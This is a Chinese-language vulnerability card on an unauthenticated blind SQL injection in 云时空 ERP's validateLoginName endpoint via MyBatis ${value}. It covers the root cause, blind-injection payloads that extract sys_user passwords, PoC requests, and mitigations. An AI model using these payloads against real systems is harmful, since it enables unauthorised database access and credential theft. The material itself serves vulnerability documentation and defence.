---
id: web-generic-sqli-yunshikong-validate-loginname-mybatis-dollar-statementtype-blind
title: 云时空ERP /sys/user/validateLoginName 未授权 MyBatis ${value} 注入：findUniqueByProperty + statementType=STATEMENT，boolean 回显只能盲注
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-finduniquebyproperty-dollar-value-statementtype-blind-sqli
aliases:
- validateLoginName SQL 注入
- findUniqueByProperty 注入
- MyBatis ${value}
- statementType=STATEMENT
- boolean 盲注
- 云时空 ERP 盲注
tags:
- web
- sqli
- java
- mybatis
- unauth
- blind
- shiro
- spring-mvc
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V531
  verified_at: '2026-11-11T16:57:59+08:00'
  notes: 已对照原文与图06-09核对：/sys/user/validateLoginName=anon(图06)、@RequestMapping validateLoginName将loginName传给userDao.findUniqueByProperty("login_name",loginName)并return user==null(图08)、Mapper XML 使用 ${propertyName} 与单引号包裹的 ${value} 且 statementType=STATEMENT(原文代码)、findUniqueByProperty存在于UserDao/MenuDao/FieldListDao/TableStructDao/TableListDao/MonitorDao六份XML(图09)均一致；boolean回显只能盲注为原文结论。与Xiahuia ERP、spring-rbac、docsys等注入卡注入点/回显/利用路径不同，非同链。原文未标受影响版本。
---

## 一句话结论

云时空 ERP 将 `/sys/user/validateLoginName` 配置为 `anon`，控制器把用户提交的 `loginName` 直接传给 `userDao.findUniqueByProperty("login_name", loginName)`，而该 Mapper 语句使用 `where ${propertyName} = '${value}'` 且 `statementType="STATEMENT"`（非预编译），导致未授权 SQL 注入；接口只返回 `user == null` 的布尔值，攻击者只能用布尔/时间盲注逐位提取数据。

## 原理

- **入口未授权**：Shiro 的 `shiroFilterChainDefinitions` 中 `/sys/user/validateLoginName = anon`，未登录即可调用该 Spring MVC 控制器。
- **参数直达 DAO**：`@RequestMapping({"validateLoginName"})` 的 `validateLoginName(String loginName, ...)` 直接调用 `this.userDao.findUniqueByProperty("login_name", loginName)`，`propertyName` 固定为 `login_name`，但 `value` 完全由请求控制。
- **MyBatis 文本替换**：Mapper 定义
  ```xml
  <select id="findUniqueByProperty" resultType="User" statementType="STATEMENT">
    select * from sys_user
    where ${propertyName} = '${value}'
      AND del_flag = '0'
  </select>
  ```
  `${...}` 是字符串拼接（不是 `#{}` 的预编译占位符），且 `statementType="STATEMENT"` 让 MyBatis 以普通 Statement 执行，进一步确认无参数绑定。`value` 被放进单引号之间，用 `'` 闭合即可注入。
- **为什么只能盲注**：控制器返回 `return user == null;`（boolean），响应只有 true/false，不返回查询结果或数据库报错细节；因此需要构造条件使查询结果在“有/无记录”之间变化（布尔盲注），或用 `SLEEP()`/`WAITFOR DELAY` 等时间函数（时间盲注）。
- **面比单点更广**：`findUniqueByProperty` 是通用 DAO 方法，搜索结果显示 `UserDao.xml`、`MenuDao.xml`、`FieldListDao.xml`、`TableStructDao.xml`、`TableListDao.xml`、`MonitorDao.xml` 等多份 Mapper 均定义该方法；其他控制器若把用户输入传给该方法的 `value`/`propertyName`，同样可注入。

## 触发条件

- 目标使用该 ERP，`/sys/user/validateLoginName` 在 Shiro 中为 `anon`；
- `userDao.xml` 的 `findUniqueByProperty` 使用 `${value}`（或 `${propertyName}`）且未做白名单/转义；
- 接口返回布尔或可区分状态，便于布尔盲注；数据库支持时间函数时可用时间盲注。

## 利用步骤

1. 未登录请求 `/sys/user/validateLoginName?loginName=<payload>`，观察返回 `true/false`；
2. 先验证注入：`loginName=1' AND '1'='1` 与 `loginName=1' AND '1'='2`，比较布尔差异（实际 SQL 为 `login_name = '<payload>' AND del_flag='0'`）；
3. 构造子查询/函数读取数据，例如按字符判断：
   `loginName=x' AND (SELECT SUBSTRING(password,1,1) FROM sys_user WHERE login_name='admin')='a' AND '1'='1`
4. 若布尔差异不稳定，改用时间盲注（MySQL `SLEEP(3)`、SQL Server `WAITFOR DELAY '0:0:3'`、Oracle `dbms_pipe.receive_message` 等），按响应时间判断；
5. 枚举 `sys_user` 等表的账号/口令/手机号字段，或将同一 payload 套用到其他调用 `findUniqueByProperty` 的接口。

## PoC

原文未给出完整盲注载荷（仅说明布尔/时间盲注可行）。最小验证形态：

```http
GET /sys/user/validateLoginName?loginName=1%27%20AND%20%271%27%3D%271 HTTP/1.1
Host: target

GET /sys/user/validateLoginName?loginName=1%27%20AND%20%271%27%3D%272 HTTP/1.1
```

前者返回 true、后者 false（或反之，取决于拼接后 SQL 语义）即可确认注入。

## 变体与关联

- `${propertyName}` 注入：若其他调用点允许控制属性名，可在 `where` 处直接注入（本例 `propertyName` 固定为 `login_name`）；
- 同方法多 Mapper：`MenuDao.xml`/`TableStructDao.xml` 等也存在 `findUniqueByProperty`，应审计所有调用点；
- 与库内 MyBatis 注入卡的区别：本卡的关键组合是“通用 DAO 方法 + `${}` + `statementType=STATEMENT` + anon 接口 + boolean 回显”，利用上必须走盲注；同类可对照 `order by`/列名注入卡。

## 检测与防御

- Mapper 全部改用 `#{}` 预编译参数；确需动态表名/列名时使用严格白名单，禁止 `${}` 接收用户输入；
- 移除 `findUniqueByProperty` 这类通用动态查询，或限制 `propertyName`/`value` 只能来自内部常量；
- Shiro 配置移除 `/sys/user/validateLoginName` 等匿名规则，或对接口增加验证码/频率限制；
- 监控同一 IP 对校验类接口的高频请求与含 SQL 关键字/引号的参数；数据库侧审计异常 `sys_user` 查询。
